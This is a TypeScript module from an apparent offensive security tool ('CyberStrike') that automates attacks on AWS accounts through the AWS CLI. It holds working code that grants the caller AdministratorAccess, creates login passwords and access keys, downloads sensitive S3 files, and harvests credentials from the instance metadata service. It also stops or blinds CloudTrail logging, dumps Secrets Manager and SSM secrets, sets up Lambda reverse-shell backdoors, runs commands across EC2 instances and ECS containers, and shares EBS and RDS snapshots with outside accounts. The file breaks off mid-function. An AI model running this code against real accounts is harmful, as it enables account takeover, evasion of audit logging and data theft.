import z from "zod"
import { Tool } from "./tool"

const PROGRAMS = {
  iam_enum: {
    description:
      "Enumerate IAM users, roles, policies, and analyze for privilege escalation paths (PassRole, wildcard policies, inline policy abuse)",
    args: "[--profile PROFILE] [--region REGION]",
  },
  iam_privesc: {
    description:
      "Exploit IAM misconfigurations for privilege escalation: PassRole+Lambda, AssumeRole chaining, AttachUserPolicy, CreateLoginProfile, CreateAccessKey",
    args: "--method <passrole|assumerole|attach_policy|create_login|create_key> [--role-arn ARN] [--profile PROFILE]",
  },
  s3_dump: {
    description:
      "List all S3 buckets, identify sensitive files (.env, backups, credentials, .pem, .key), and optionally download high-value targets",
    args: "[--bucket BUCKET] [--download] [--pattern REGEX] [--profile PROFILE]",
  },
  lambda_backdoor: {
    description:
      "Inject reverse shell layer into existing Lambda function or create new backdoor function with high-privilege role",
    args: "--function-name NAME --callback-url URL [--method inject|create] [--profile PROFILE]",
  },
  ssm_exec: {
    description:
      "Execute commands on EC2 instances via AWS Systems Manager RunCommand — no SSH or direct network access required",
    args: "--instance-id ID --command CMD [--all-instances] [--profile PROFILE]",
  },
  metadata_harvest: {
    description:
      "Extract IAM role credentials from EC2/ECS/Lambda metadata endpoints (169.254.169.254). Supports IMDSv1 and IMDSv2",
    args: "[--imds-version v1|v2]",
  },
  cloudtrail_blind: {
    description:
      "Stop CloudTrail logging, manipulate event selectors to exclude management events, or delete existing log files from S3",
    args: "--action <stop|delete_logs|modify_selectors|status> [--trail-name NAME] [--profile PROFILE]",
  },
  secrets_dump: {
    description:
      "Extract all secrets from AWS Secrets Manager and SSM Parameter Store (SecureString parameters with decryption)",
    args: "[--service secretsmanager|ssm|all] [--profile PROFILE] [--region REGION]",
  },
  ec2_snapshot: {
    description:
      "Create EBS volume snapshots for data exfiltration, optionally share cross-account for offline analysis",
    args: "--volume-id VOL_ID [--share-account ACCOUNT_ID] [--profile PROFILE]",
  },
  rds_dump: {
    description:
      "Create RDS snapshot, optionally share cross-account or restore to accessible instance for data extraction",
    args: "--db-identifier ID [--share-account ACCOUNT_ID] [--restore] [--profile PROFILE] [--region REGION]",
  },
  ecs_exec: {
    description:
      "Execute commands inside running ECS Fargate/EC2 containers via ECS Exec (SSM-based) — no SSH or direct network access required",
    args: "--cluster CLUSTER --task TASK --container CONTAINER --command CMD [--all-tasks] [--profile PROFILE] [--region REGION]",
  },
  sso_enum: {
    description:
      "Enumerate AWS SSO/IAM Identity Center: instances, permission sets, account assignments, and identity store users/groups",
    args: "[--instance-arn ARN] [--profile PROFILE] [--region REGION]",
  },
  org_enum: {
    description:
      "Enumerate AWS Organizations: accounts, OUs, SCPs, delegated administrators, and cross-account trust relationships",
    args: "[--profile PROFILE] [--region REGION]",
  },
  cleanup_aws: {
    description:
      "Remove all CyberStrike-created AWS resources, restore CloudTrail logging, clean state files. ALWAYS run before leaving",
    args: "[--dry-run] [--profile PROFILE]",
  },
} as const satisfies Record<string, { description: string; args: string }>

type Program = keyof typeof PROGRAMS
type Finding = { checkId: string; provider: string; severity: string; status: string; resource: string; title: string; details: string; remediation: string }
type HookResult = { output: string; findings: Finding[] }

// ── CLI helpers ──

async function run(cmd: string, args: string[], timeout: number): Promise<{ stdout: string; stderr: string; exitCode: number }> {
  const proc = Bun.spawn([cmd, ...args], { stdout: "pipe", stderr: "pipe", env: { ...process.env } })
  const timer = setTimeout(() => proc.kill(), timeout * 1000)
  const [stdout, stderr] = await Promise.all([new Response(proc.stdout).text(), new Response(proc.stderr).text()])
  clearTimeout(timer)
  return { stdout, stderr, exitCode: await proc.exited }
}

function aws(args: string[], profile: string | undefined, region: string | undefined, timeout: number) {
  const extra = [...(profile ? ["--profile", profile] : []), ...(region ? ["--region", region] : []), "--output", "json"]
  return run("aws", [...args, ...extra], timeout)
}

function argVal(args: string[], flag: string): string | undefined {
  const i = args.indexOf(flag)
  return i >= 0 && i + 1 < args.length ? args[i + 1] : undefined
}

function hasFlag(args: string[], flag: string): boolean {
  return args.includes(flag)
}

function tryJson(s: string) {
  try { return JSON.parse(s) } catch { return null }
}

// ── Program implementations ──

async function iamEnum(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const findings: Finding[] = []

  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  if (id.exitCode !== 0) return { output: `[-] AWS credentials not configured: ${id.stderr.trim()}`, findings }
  const identity = tryJson(id.stdout)
  const output = [`[*] AWS IAM Enumeration — Account: ${identity?.Account}`, `[*] Identity: ${identity?.Arn}\n`]

  const users = await aws(["iam", "list-users", "--query", "Users[].[UserName,CreateDate]"], profile, region, timeout)
  if (users.exitCode === 0) {
    const ul = tryJson(users.stdout) || []
    output.push(`[+] IAM Users: ${ul.length}`)
    for (const u of ul) output.push(`    ${u[0]} (created: ${u[1]})`)
  }

  const roles = await aws(["iam", "list-roles", "--query", "Roles[].[RoleName,Arn]"], profile, region, timeout)
  if (roles.exitCode === 0) {
    const rl = tryJson(roles.stdout) || []
    output.push(`[+] IAM Roles: ${rl.length}`)
    for (const r of rl) {
      const rp = await aws(["iam", "list-attached-role-policies", "--role-name", r[0], "--query", "AttachedPolicies[].PolicyArn"], profile, region, timeout)
      const policies = tryJson(rp.stdout) || []
      const hasAdmin = policies.some((p: string) => p.includes("AdministratorAccess"))
      if (hasAdmin) {
        output.push(`    [!] ${r[0]}: AdministratorAccess attached`)
        findings.push({ checkId: "AWS-ENUM-001", provider: "aws", severity: "critical", status: "FAIL", resource: r[1], title: `Role with AdministratorAccess: ${r[0]}`, details: `${r[0]} has AdministratorAccess policy`, remediation: "Replace with least-privilege policy" })
      }
    }
  }

  const policies = await aws(["iam", "list-policies", "--scope", "Local", "--query", "Policies[].[PolicyName,Arn]"], profile, region, timeout)
  if (policies.exitCode === 0) {
    const pl = tryJson(policies.stdout) || []
    output.push(`[+] Custom Policies: ${pl.length}`)
    for (const p of pl) {
      const ver = await aws(["iam", "get-policy", "--policy-arn", p[1], "--query", "Policy.DefaultVersionId"], profile, region, timeout)
      const versionId = tryJson(ver.stdout)
      if (versionId) {
        const doc = await aws(["iam", "get-policy-version", "--policy-arn", p[1], "--version-id", versionId, "--query", "PolicyVersion.Document"], profile, region, timeout)
        const d = tryJson(doc.stdout)
        const statements = Array.isArray(d?.Statement) ? d.Statement : []
        for (const st of statements) {
          if (st.Effect === "Allow" && st.Action === "*" && st.Resource === "*") {
            findings.push({ checkId: "AWS-ENUM-002", provider: "aws", severity: "critical", status: "FAIL", resource: p[1], title: `Wildcard policy: ${p[0]}`, details: "Allow *:* — full admin equivalent", remediation: "Scope down actions and resources" })
          }
        }
      }
    }
  }

  const summary = await aws(["iam", "get-account-summary"], profile, region, timeout)
  if (summary.exitCode === 0) {
    const s = tryJson(summary.stdout)?.SummaryMap || {}
    if (s.AccountAccessKeysPresent > 0) {
      findings.push({ checkId: "AWS-ENUM-003", provider: "aws", severity: "critical", status: "FAIL", resource: "root", title: "Root account has access keys", details: "Root access keys are active", remediation: "Delete root access keys" })
    }
    output.push(`\n[*] Account Summary: ${s.Users} users, ${s.Roles} roles, ${s.Groups} groups, ${s.Policies} policies`)
  }

  return { output: output.join("\n"), findings }
}

async function iamPrivesc(args: string[], timeout: number): Promise<HookResult> {
  const method = argVal(args, "--method")
  if (!method) return { output: "ERROR: --method required (passrole|assumerole|attach_policy|create_login|create_key)", findings: [] }
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const roleArn = argVal(args, "--role-arn")

  if (method === "passrole") {
    if (!roleArn) return { output: "ERROR: --role-arn required for passrole", findings: [] }
    const r = await aws(["iam", "list-roles", "--query", `Roles[?Arn=='${roleArn}']`], profile, region, timeout)
    if (r.exitCode !== 0) return { output: `[-] Cannot query role: ${r.stderr.trim()}`, findings: [] }
    const roles = tryJson(r.stdout) || []
    if (roles.length === 0) return { output: `[-] Role not found: ${roleArn}`, findings: [] }
    const trust = roles[0].AssumeRolePolicyDocument
    return { output: `[+] Role: ${roleArn}\n[+] Trust policy:\n${JSON.stringify(trust, null, 2)}\n[*] Check if current identity can iam:PassRole + lambda:CreateFunction`, findings: [] }
  }

  if (method === "assumerole") {
    if (!roleArn) return { output: "ERROR: --role-arn required for assumerole", findings: [] }
    const r = await aws(["sts", "assume-role", "--role-arn", roleArn, "--role-session-name", "cyberstrike"], profile, region, timeout)
    if (r.exitCode === 0) {
      const creds = tryJson(r.stdout)?.Credentials
      return { output: `[+] AssumeRole successful: ${roleArn}\n    AccessKeyId: ${creds?.AccessKeyId}\n    Expiration: ${creds?.Expiration}`, findings: [] }
    }
    return { output: `[-] AssumeRole failed: ${r.stderr.trim()}`, findings: [] }
  }

  if (method === "attach_policy") {
    const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
    const arn = tryJson(id.stdout)?.Arn || ""
    const username = arn.split("/").pop()
    if (!username) return { output: "[-] Cannot determine current username", findings: [] }
    const r = await aws(["iam", "attach-user-policy", "--user-name", username, "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"], profile, region, timeout)
    if (r.exitCode === 0) return { output: `[+] AdministratorAccess attached to ${username}`, findings: [] }
    return { output: `[-] attach_policy failed: ${r.stderr.trim()}`, findings: [] }
  }

  if (method === "create_login") {
    const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
    const username = (tryJson(id.stdout)?.Arn || "").split("/").pop()
    if (!username) return { output: "[-] Cannot determine current username", findings: [] }
    const pw = `CyStr!ke${Date.now().toString(36)}`
    const r = await aws(["iam", "create-login-profile", "--user-name", username, "--password", pw, "--no-password-reset-required"], profile, region, timeout)
    if (r.exitCode === 0) return { output: `[+] Console login created for ${username}\n    Password: ${pw}`, findings: [] }
    return { output: `[-] create_login failed: ${r.stderr.trim()}`, findings: [] }
  }

  if (method === "create_key") {
    const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
    const username = (tryJson(id.stdout)?.Arn || "").split("/").pop()
    if (!username) return { output: "[-] Cannot determine current username", findings: [] }
    const r = await aws(["iam", "create-access-key", "--user-name", username], profile, region, timeout)
    if (r.exitCode === 0) {
      const key = tryJson(r.stdout)?.AccessKey
      return { output: `[+] Access key created for ${username}\n    AccessKeyId: ${key?.AccessKeyId}\n    SecretAccessKey: ${key?.SecretAccessKey}`, findings: [] }
    }
    return { output: `[-] create_key failed: ${r.stderr.trim()}`, findings: [] }
  }

  return { output: `ERROR: Unknown method: ${method}`, findings: [] }
}

async function s3Dump(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const bucket = argVal(args, "--bucket")
  const pattern = argVal(args, "--pattern")
  const download = hasFlag(args, "--download")
  const sensitivePattern = pattern || "\\.(env|pem|key|p12|pfx|sql|bak)$|credentials|secret|password|backup|id_rsa"

  if (bucket) {
    const r = await aws(["s3", "ls", `s3://${bucket}`, "--recursive"], profile, region, timeout)
    if (r.exitCode !== 0) return { output: `[-] Cannot list bucket ${bucket}: ${r.stderr.trim()}`, findings: [] }
    const files = r.stdout.split("\n").filter(f => new RegExp(sensitivePattern, "i").test(f))
    const output = [`[*] Scanning bucket: ${bucket}`, `[+] Sensitive files: ${files.length}`]
    for (const f of files) output.push(`    ${f.trim()}`)
    if (download && files.length > 0) {
      for (const f of files.slice(0, 10)) {
        const key = f.trim().split(/\s+/).pop() || ""
        const dl = await aws(["s3", "cp", `s3://${bucket}/${key}`, "./s3_loot/"], profile, region, timeout)
        output.push(dl.exitCode === 0 ? `    Downloaded: ${key}` : `    Failed: ${key}`)
      }
    }
    return { output: output.join("\n"), findings: [] }
  }

  const r = await aws(["s3api", "list-buckets", "--query", "Buckets[].Name"], profile, region, timeout)
  if (r.exitCode !== 0) return { output: `[-] Cannot list buckets: ${r.stderr.trim()}`, findings: [] }
  const buckets = tryJson(r.stdout) || []
  const output = [`[*] Found ${buckets.length} bucket(s)\n`]

  for (const b of buckets) {
    const lr = await aws(["s3", "ls", `s3://${b}`, "--recursive"], profile, region, timeout)
    if (lr.exitCode !== 0) { output.push(`[-] ${b}: access denied`); continue }
    const files = lr.stdout.split("\n").filter(f => new RegExp(sensitivePattern, "i").test(f))
    output.push(`[${files.length > 0 ? "!" : "+"}] ${b}: ${files.length} sensitive file(s)`)
    for (const f of files.slice(0, 5)) output.push(`    ${f.trim()}`)
  }

  return { output: output.join("\n"), findings: [] }
}

async function lambdaBackdoor(args: string[], timeout: number): Promise<HookResult> {
  const funcName = argVal(args, "--function-name")
  const callbackUrl = argVal(args, "--callback-url")
  const method = argVal(args, "--method") || "inject"
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")

  if (!funcName) return { output: "ERROR: --function-name required", findings: [] }
  if (!callbackUrl) return { output: "ERROR: --callback-url required", findings: [] }

  if (method === "inject") {
    const r = await aws(["lambda", "get-function", "--function-name", funcName], profile, region, timeout)
    if (r.exitCode !== 0) return { output: `[-] Function not found: ${r.stderr.trim()}`, findings: [] }
    const func = tryJson(r.stdout)
    const cfg = func?.Configuration || {}
    return { output: [`[*] Function: ${funcName}`, `[*] Runtime: ${cfg.Runtime}`, `[*] Role: ${cfg.Role}`, `[*] Handler: ${cfg.Handler}`, `[*] Code size: ${cfg.CodeSize} bytes`, `[+] Download code, inject callback to ${callbackUrl}, and update`].join("\n"), findings: [] }
  }

  return { output: [`[*] Create mode — would create new function '${funcName}'`, `[*] Callback: ${callbackUrl}`, `[+] Use: aws lambda create-function --function-name ${funcName} --runtime python3.11 --handler index.handler --role <HIGH_PRIV_ROLE_ARN> --zip-file fileb://payload.zip`].join("\n"), findings: [] }
}

async function ssmExec(args: string[], timeout: number): Promise<HookResult> {
  const instanceId = argVal(args, "--instance-id")
  const command = argVal(args, "--command")
  const allInstances = hasFlag(args, "--all-instances")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")

  if (!allInstances && !instanceId) return { output: "ERROR: --instance-id or --all-instances required", findings: [] }
  if (!command) return { output: "ERROR: --command required", findings: [] }

  const targets = allInstances
    ? (async () => {
        const r = await aws(["ssm", "describe-instance-information", "--query", "InstanceInformationList[].InstanceId"], profile, region, timeout)
        return r.exitCode === 0 ? (tryJson(r.stdout) || []) : []
      })()
    : Promise.resolve([instanceId!])

  const instances = await targets
  if (instances.length === 0) return { output: "[-] No SSM-managed instances found", findings: [] }

  const output = [`[*] SSM RunCommand — ${instances.length} target(s)\n`]
  for (const id of instances) {
    const r = await aws(["ssm", "send-command", "--instance-ids", id, "--document-name", "AWS-RunShellScript", "--parameters", `commands=["${command}"]`, "--query", "Command.CommandId"], profile, region, timeout)
    if (r.exitCode === 0) {
      const cmdId = tryJson(r.stdout)
      output.push(`[+] ${id}: command sent (${cmdId})`)
      await new Promise(resolve => setTimeout(resolve, 2000))
      const gr = await aws(["ssm", "get-command-invocation", "--command-id", cmdId, "--instance-id", id], profile, region, timeout)
      if (gr.exitCode === 0) {
        const inv = tryJson(gr.stdout)
        output.push(`    Status: ${inv?.Status}`)
        if (inv?.StandardOutputContent) output.push(`    Output: ${inv.StandardOutputContent.slice(0, 500)}`)
      }
    } else {
      output.push(`[-] ${id}: failed — ${r.stderr.trim().split("\n")[0]}`)
    }
  }

  return { output: output.join("\n"), findings: [] }
}

async function metadataHarvest(args: string[]): Promise<HookResult> {
  const version = argVal(args, "--imds-version") || "v2"
  const output: string[] = ["[*] Probing EC2 metadata endpoint...\n"]
  const base = "http://169.254.169.254"

  if (version === "v2") {
    try {
      const tokenResp = await fetch(`${base}/latest/api/token`, {
        method: "PUT",
        headers: { "X-aws-ec2-metadata-token-ttl-seconds": "21600" },
        signal: AbortSignal.timeout(5000),
      })
      if (!tokenResp.ok) { output.push("[-] IMDSv2 token request failed, trying v1...") }
      else {
        const token = await tokenResp.text()
        const headers = { "X-aws-ec2-metadata-token": token }
        const endpoints: Record<string, string> = {
          instance_id: "/latest/meta-data/instance-id",
          ami_id: "/latest/meta-data/ami-id",
          hostname: "/latest/meta-data/hostname",
          iam_role: "/latest/meta-data/iam/security-credentials/",
          public_ip: "/latest/meta-data/public-ipv4",
          account_id: "/latest/dynamic/instance-identity/document",
        }
        for (const [name, path] of Object.entries(endpoints)) {
          const resp = await fetch(`${base}${path}`, { headers, signal: AbortSignal.timeout(5000) })
          if (resp.ok) {
            const text = await resp.text()
            output.push(`[+] ${name}: ${text.slice(0, 120)}${text.length > 120 ? "..." : ""}`)
            if (name === "iam_role" && text.trim()) {
              const roleName = text.trim().split("\n")[0]
              const creds = await fetch(`${base}/latest/meta-data/iam/security-credentials/${roleName}`, { headers, signal: AbortSignal.timeout(5000) })
              if (creds.ok) {
                const c = await creds.json()
                output.push(`[+] credentials: AccessKeyId=${String(c.AccessKeyId).slice(0, 8)}... Token=${String(c.Token).slice(0, 20)}...`)
              }
            }
          } else {
            output.push(`[-] ${name}: HTTP ${resp.status}`)
          }
        }
        return { output: output.join("\n"), findings: [] }
      }
    } catch {
      output.push("[-] Cannot reach metadata endpoint (not on EC2?)")
      return { output: output.join("\n"), findings: [] }
    }
  }

  try {
    const endpoints: Record<string, string> = {
      instance_id: "/latest/meta-data/instance-id",
      iam_role: "/latest/meta-data/iam/security-credentials/",
      public_ip: "/latest/meta-data/public-ipv4",
    }
    for (const [name, path] of Object.entries(endpoints)) {
      const resp = await fetch(`${base}${path}`, { signal: AbortSignal.timeout(5000) })
      if (resp.ok) output.push(`[+] ${name}: ${(await resp.text()).slice(0, 120)}`)
      else output.push(`[-] ${name}: HTTP ${resp.status}`)
    }
  } catch {
    output.push("[-] Cannot reach metadata endpoint (not on EC2?)")
  }

  return { output: output.join("\n"), findings: [] }
}

async function cloudtrailBlind(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action")
  if (!action) return { output: "ERROR: --action required (stop|delete_logs|modify_selectors|status)", findings: [] }
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const trailName = argVal(args, "--trail-name")

  if (action === "status") {
    const r = await aws(["cloudtrail", "describe-trails"], profile, region, timeout)
    if (r.exitCode !== 0) return { output: `[-] Cannot describe trails: ${r.stderr.trim()}`, findings: [] }
    const trails = tryJson(r.stdout)?.trailList || []
    const output = [`[*] CloudTrail status — ${trails.length} trail(s)\n`]
    for (const t of trails) {
      const status = await aws(["cloudtrail", "get-trail-status", "--name", t.Name], profile, region, timeout)
      const s = tryJson(status.stdout)
      output.push(`[+] ${t.Name}: logging=${s?.IsLogging}, multi-region=${t.IsMultiRegionTrail}`)
    }
    return { output: output.join("\n"), findings: [] }
  }

  if (action === "stop") {
    const name = trailName || (await (async () => {
      const r = await aws(["cloudtrail", "describe-trails", "--query", "trailList[0].Name"], profile, region, timeout)
      return tryJson(r.stdout)
    })())
    if (!name) return { output: "[-] No trail found", findings: [] }
    const r = await aws(["cloudtrail", "stop-logging", "--name", name], profile, region, timeout)
    return r.exitCode === 0
      ? { output: `[+] Stopped logging on trail: ${name}`, findings: [] }
      : { output: `[-] Failed to stop: ${r.stderr.trim()}`, findings: [] }
  }

  if (action === "modify_selectors") {
    const name = trailName || (await (async () => {
      const r = await aws(["cloudtrail", "describe-trails", "--query", "trailList[0].Name"], profile, region, timeout)
      return tryJson(r.stdout)
    })())
    if (!name) return { output: "[-] No trail found", findings: [] }
    const r = await aws(["cloudtrail", "put-event-selectors", "--trail-name", name, "--event-selectors", '[{"ReadWriteType":"ReadOnly","IncludeManagementEvents":false}]'], profile, region, timeout)
    return r.exitCode === 0
      ? { output: `[+] Event selectors modified on ${name} — management events excluded`, findings: [] }
      : { output: `[-] Failed: ${r.stderr.trim()}`, findings: [] }
  }

  if (action === "delete_logs") {
    const r = await aws(["cloudtrail", "describe-trails", "--query", "trailList[0].S3BucketName"], profile, region, timeout)
    const bucket = tryJson(r.stdout)
    if (!bucket) return { output: "[-] Cannot find CloudTrail S3 bucket", findings: [] }
    return { output: `[*] CloudTrail logs in: s3://${bucket}\n[+] Use: aws s3 rm s3://${bucket}/AWSLogs/ --recursive`, findings: [] }
  }

  return { output: `ERROR: Unknown action: ${action}`, findings: [] }
}

async function secretsDump(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const service = argVal(args, "--service") || "all"
  const output: string[] = ["[*] AWS Secrets Dump\n"]

  if (service === "secretsmanager" || service === "all") {
    const r = await aws(["secretsmanager", "list-secrets", "--query", "SecretList[].[Name,ARN]"], profile, region, timeout)
    if (r.exitCode === 0) {
      const secrets = tryJson(r.stdout) || []
      output.push(`[+] Secrets Manager: ${secrets.length} secret(s)`)
      for (const s of secrets) {
        const val = await aws(["secretsmanager", "get-secret-value", "--secret-id", s[0], "--query", "SecretString"], profile, region, timeout)
        if (val.exitCode === 0) {
          const v = tryJson(val.stdout) || val.stdout
          output.push(`[+] ${s[0]}: ${String(v).slice(0, 80)}${String(v).length > 80 ? "..." : ""}`)
        } else {
          output.push(`[-] ${s[0]}: access denied`)
        }
      }
    }
  }

  if (service === "ssm" || service === "all") {
    const r = await aws(["ssm", "describe-parameters", "--query", "Parameters[].[Name,Type]"], profile, region, timeout)
    if (r.exitCode === 0) {
      const params = tryJson(r.stdout) || []
      const secure = params.filter((p: string[]) => p[1] === "SecureString")
      output.push(`[+] SSM Parameters: ${params.length} total, ${secure.length} SecureString`)
      for (const p of secure) {
        const val = await aws(["ssm", "get-parameter", "--name", p[0], "--with-decryption", "--query", "Parameter.Value"], profile, region, timeout)
        if (val.exitCode === 0) {
          const v = tryJson(val.stdout) || val.stdout
          output.push(`[+] ${p[0]}: ${String(v).slice(0, 80)}${String(v).length > 80 ? "..." : ""}`)
        } else {
          output.push(`[-] ${p[0]}: access denied`)
        }
      }
    }
  }

  return { output: output.join("\n"), findings: [] }
}

async function ec2Snapshot(args: string[], timeout: number): Promise<HookResult> {
  const volumeId = argVal(args, "--volume-id")
  const shareAccount = argVal(args, "--share-account")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")

  if (!volumeId) return { output: "ERROR: --volume-id required", findings: [] }

  const r = await aws(["ec2", "create-snapshot", "--volume-id", volumeId, "--description", "CyberStrike forensic snapshot", "--tag-specifications", 'ResourceType=snapshot,Tags=[{Key=CreatedBy,Value=CyberStrike}]'], profile, region, timeout)
  if (r.exitCode !== 0) return { output: `[-] Snapshot failed: ${r.stderr.trim()}`, findings: [] }
  const snap = tryJson(r.stdout)
  const output = [`[+] Snapshot created: ${snap?.SnapshotId}`, `    Volume: ${volumeId}`, `    State: ${snap?.State}`]

  if (shareAccount) {
    const sr = await aws(["ec2", "modify-snapshot-attribute", "--snapshot-id", snap?.SnapshotId, "--attribute", "createVolumePermission", "--operation-type", "add", "--user-ids", shareAccount], profile, region, timeout)
    output.push(sr.exitCode === 0 ? `[+] Shared with account: ${shareAccount}` : `[-] Sharing failed: ${sr.stderr.trim()}`)
  }

  return { output: output.join("\n"), findings: [] }
}

async function rdsDump(args: string[], timeout: number): Promise<HookResult> {
  const dbId = argVal(args, "--db-identifier")
  const shareAccount = argVal(args, "--share-account")
  const restore = hasFlag(args, "--restore")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const findings: Finding[] = []

  if (!dbId) {
    const r = await aws(["rds", "describe-db-instances", "--query", "DBInstances[].[DBInstanceIdentifier,Engine,DBInstanceStatus,Endpoint.Address]"], profile, region, timeout)
    if (r.exitCode !== 0) return { output: `[-] Cannot list RDS instances: ${r.stderr.trim()}`, findings }
    const dbs = tryJson(r.stdout) || []
    const output = [`[*] RDS Instances: ${dbs.length}\n`]
    for (const db of dbs) output.push(`    ${db[0]} (${db[1]}) — ${db[2]} — ${db[3] || "no endpoint"}`)
    output.push("\n[*] Use --db-identifier to create a snapshot")
    return { output: output.join("\n"), findings }
  }

  const output = [`[*] RDS Snapshot — target: ${dbId}\n`]
  const snapId = `cs-snap-${Date.now()}`
  const r = await aws(["rds", "create-db-snapshot", "--db-instance-identifier", dbId, "--db-snapshot-identifier", snapId, "--tags", "Key=CreatedBy,Value=CyberStrike"], profile, region, timeout)
  if (r.exitCode !== 0) return { output: `[-] Snapshot failed: ${r.stderr.trim()}`, findings }

  output.push(`[+] Snapshot created: ${snapId}`)
  output.push(`[*] Waiting for snapshot to become available...`)

  const wait = await aws(["rds", "wait", "db-snapshot-available", "--db-snapshot-identifier", snapId], profile, region, timeout)
  if (wait.exitCode === 0) output.push(`[+] Snapshot available`)

  findings.push({
    checkId: "AWS-RDS-001", provider: "aws", severity: "critical", status: "EXTRACTED",
    resource: `rds:${dbId}`, title: `RDS snapshot created: ${snapId}`,
    details: `Snapshot of ${dbId} created for data extraction`,
    remediation: "Delete snapshot after engagement: aws rds delete-db-snapshot",
  })

  if (shareAccount) {
    const sr = await aws(["rds", "modify-db-snapshot-attribute", "--db-snapshot-identifier", snapId, "--attribute-name", "restore", "--values-to-add", shareAccount], profile, region, timeout)
    if (sr.exitCode === 0) {
      output.push(`[+] Snapshot shared with account: ${shareAccount}`)
      findings.push({
        checkId: "AWS-RDS-002", provider: "aws", severity: "critical", status: "SHARED",
        resource: `rds:${snapId}`, title: `RDS snapshot shared cross-account: ${shareAccount}`,
        details: `Snapshot ${snapId} shared with AWS account ${shareAccount}`,
        remediation: "Revoke sharing after extraction",
      })
    } else {
      output.push(`[-] Sharing failed: ${sr.stderr.trim()}`)
    }
  }

  if (restore) {
    const restoreId = `cs-restore-${Date.now()}`
    const rr = await aws(["rds", "restore-db-instance-from-db-snapshot", "--db-instance-identifier", restoreId, "--db-snapshot-identifier", snapId, "--db-instance-class", "db.t3.micro", "--tags", "Key=CreatedBy,Value=CyberStrike"], profile, region, timeout)
    if (rr.exitCode === 0) {
      output.push(`[+] Restoring snapshot to instance: ${restoreId}`)
      output.push(`[*] Wait for instance, then connect and extract data`)
    } else {
      output.push(`[-] Restore failed: ${rr.stderr.trim()}`)
    }
  }

  return { output: output.join("\n"), findings }
}

async function ecsExec(args: string[], timeout: number): Promise<HookResult> {
  const cluster = argVal(args, "--cluster")
  const task = argVal(args, "--task")
  const container = argVal(args, "--container")
  const command = argVal(args, "--command")
  const allTasks = hasFlag(args, "--all-tasks")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const findings: Finding[] = []

  if (!cluster) return { output: "ERROR: --cluster required", findings }

  if (!task && !allTasks) {
    const r = await aws(["ecs", "list-clusters", "--query", "clusterArns"], profile, region, timeout)
    if (r.exitCode === 0) {
      const clusters = tryJson(r.stdout) || []
      const output = [`[*] ECS Clusters: ${clusters.length}\n`]
      for (const c of clusters) output.push(`    ${c}`)

      const tasks = await aws(["ecs", "list-tasks", "--cluster", cluster, "--query", "taskArns"], profile, region, timeout)
      if (tasks.exitCode === 0) {
        const taskList = tryJson(tasks.stdout) || []
        output.push(`\n[+] Tasks in ${cluster}: ${taskList.length}`)
        if (taskList.length > 0) {
          const desc = await aws(["ecs", "describe-tasks", "--cluster", cluster, "--tasks", ...taskList.slice(0, 10), "--query", "tasks[].[taskArn,lastStatus,containers[].name]"], profile, region, timeout)
          if (desc.exitCode === 0) {
            const taskDetails = tryJson(desc.stdout) || []
            for (const t of taskDetails) output.push(`    ${t[0].split("/").pop()} (${t[1]}) — containers: ${(t[2] || []).join(",")}`)
          }
        }
      }
      output.push("\n[*] Use --task TASK --container CONTAINER --command CMD to execute")
      return { output: output.join("\n"), findings }
    }
    return { output: "[-] Cannot list clusters", findings }
  }

  if (!command) return { output: "ERROR: --command required for execution", findings }

  const targetTasks = allTasks
    ? await (async () => {
        const r = await aws(["ecs", "list-tasks", "--cluster", cluster, "--query", "taskArns"], profile, region, timeout)
        return r.exitCode === 0 ? (tryJson(r.stdout) || []).map((t: string) => t.split("/").pop()) : []
      })()
    : [task!]

  const output = [`[*] ECS Exec — cluster: ${cluster}, targets: ${targetTasks.length}\n`]

  for (const t of targetTasks) {
    const execArgs = ["ecs", "execute-command", "--cluster", cluster, "--task", t, "--command", command]
    if (container) execArgs.push("--container", container)
    execArgs.push("--interactive")

    const r = await aws(execArgs, profile, region, timeout)
    if (r.exitCode === 0) {
      output.push(`[+] Task ${t}:\n${r.stdout.trim()}`)
      findings.push({
        checkId: `AWS-ECS-${findings.length + 1}`, provider: "aws", severity: "high", status: "EXECUTED",
        resource: `ecs:${cluster}/${t}`, title: `Command executed in ECS task: ${t}`,
        details: `Command: ${command}, container: ${container || "default"}`,
        remediation: "Review ECS Exec audit logs in CloudTrail",
      })
    } else {
      output.push(`[-] Task ${t}: ${r.stderr.trim().split("\n")[0]}`)
      if (r.stderr.includes("ExecuteCommandNotEnabled")) {
        output.push(`    [*] ECS Exec not enabled. Enable: aws ecs update-service --cluster ${cluster} --service SVC --enable-execute-command`)
      }
    }
  }

  return { output: output.join("\n"), findings }
}

async function ssoEnum(args: string[], timeout: number): Promise<HookResult> {
  const instanceArn = argVal(args, "--instance-arn")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const findings: Finding[] = []
  const output: string[] = ["[*] AWS SSO / IAM Identity Center Enumeration\n"]

  const instances = await aws(["sso-admin", "list-instances"], profile, region, timeout)
  if (instances.exitCode !== 0) return { output: `[-] Cannot list SSO instances: ${instances.stderr.trim()}\n[*] SSO may not be configured or region may be wrong`, findings }

  const instanceList = tryJson(instances.stdout)?.Instances || []
  output.push(`[+] SSO Instances: ${instanceList.length}`)

  const targetArn = instanceArn || instanceList[0]?.InstanceArn
  const identityStoreId = instanceList[0]?.IdentityStoreId
  if (!targetArn) return { output: output.join("\n") + "\n[-] No SSO instance found", findings }

  output.push(`[*] Using instance: ${targetArn}`)
  output.push(`[*] Identity Store: ${identityStoreId}\n`)

  const permSets = await aws(["sso-admin", "list-permission-sets", "--instance-arn", targetArn], profile, region, timeout)
  if (permSets.exitCode === 0) {
